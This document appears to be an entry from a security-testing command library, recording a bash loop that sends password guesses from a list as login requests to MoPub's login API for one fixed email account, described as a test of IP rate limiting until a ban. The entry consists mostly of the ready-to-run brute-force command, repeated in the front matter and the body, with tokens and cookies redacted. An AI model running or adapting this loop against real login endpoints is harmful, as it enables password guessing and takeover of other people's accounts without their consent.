---
data: >-
  while read pass; do curl -i -s -k -X $'POST' -H $'Host: app.mopub.com' -H
  $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101
  Firefox/73.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H
  $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H
  $'x-csrftoken: ███████' -H $'Origin: https://app.mopub.com' -H $'Referer:
  https://app.mopub.com/login?next=/' -H $'Cookie: csrftoken=███████;
  _ga=██████;
  mp__mixpanel=%7B%22distinct_id%22%3A%20%███%22%2C%22$device_id%22%3A%20%███████%22%2C%22accountKey%22%3A%20%22%22%2C%22accessLevel%22%3A%20%22%22%2C%22$initial_referrer%22%3A%20%22$direct%22%2C%22$initial_referring_domain%22%3A%20%22$direct%22%7D;
  ██████_mixpanel=%7B%22distinct_id%22%3A%20%22██████████%22%2C%22$initial_referrer%22%3A%20%22https%3A%2F%2Fapp.mopub.com%2Faccount%2Flogin%2F%22%2C%22$initial_referring_domain%22%3A%20%22app.mopub.com%22%2C%22accessLevel%22%3A%20%22loggedOut%22%2C%22accountKey%22%3A%20null%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%2C%22$user_id%22%3A%20%22█████%22%2C%22$had_persisted_distinct_id%22%3A%20true%2C%22$device_id%22%3A%20%22████████%22%7D;
  mp_mixpanel__c=3' --data-binary
  $'{"username":"alert.wids@gmail.com","password":"$pass"}'
  $'https://app.mopub.com/web-client/api/user/login';done < PASS_LIST
tags:
  - brute-force
  - rate-limit
type: command
executor: bash
platforms:
  - Web
  - Linux
id: bf0e8bf6-3caf-48b4-85de-21c9055cb2a6
created_at: '2025-12-14T17:30:26.709Z'
updated_at: '2025-12-14T17:30:26.709Z'
verified: false
validated: true
submitted: true
---
# mopub-rate-limit-test-curl-loop

## Command

```bash
while read pass; do curl -i -s -k -X $'POST' -H $'Host: app.mopub.com' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'x-csrftoken: ███████' -H $'Origin: https://app.mopub.com' -H $'Referer: https://app.mopub.com/login?next=/' -H $'Cookie: csrftoken=███████; _ga=██████; mp__mixpanel=%7B%22distinct_id%22%3A%20%███%22%2C%22$device_id%22%3A%20%███████%22%2C%22accountKey%22%3A%20%22%22%2C%22accessLevel%22%3A%20%22%22%2C%22$initial_referrer%22%3A%20%22$direct%22%2C%22$initial_referring_domain%22%3A%20%22$direct%22%7D; ██████_mixpanel=%7B%22distinct_id%22%3A%20%22██████████%22%2C%22$initial_referrer%22%3A%20%22https%3A%2F%2Fapp.mopub.com%2Faccount%2Flogin%2F%22%2C%22$initial_referring_domain%22%3A%20%22app.mopub.com%22%2C%22accessLevel%22%3A%20%22loggedOut%22%2C%22accountKey%22%3A%20null%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%2C%22$user_id%22%3A%20%22█████%22%2C%22$had_persisted_distinct_id%22%3A%20true%2C%22$device_id%22%3A%20%22████████%22%7D; mp_mixpanel__c=3' --data-binary $'{"username":"alert.wids@gmail.com","password":"$pass"}' $'https://app.mopub.com/web-client/api/user/login';done < PASS_LIST
```

## Description

Loops through a password list (PASS_LIST) to send POST login requests to MoPub, testing until IP rate limit ban (~120 requests).

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| pass | Password from PASS_LIST | Yes |
| x-csrftoken | CSRF token | Yes |
| Cookie | Session cookies | Yes |
| username | Fixed target email | Yes |

## Examples

### Basic Usage

Run with PASS_LIST containing passwords.

## Expected Output

HTTP responses: 401/400 for fails; 503 after ban.

## Related

- [[procedures/Test-IP-Based-Rate-Limiting-on-MoPub-Login]]
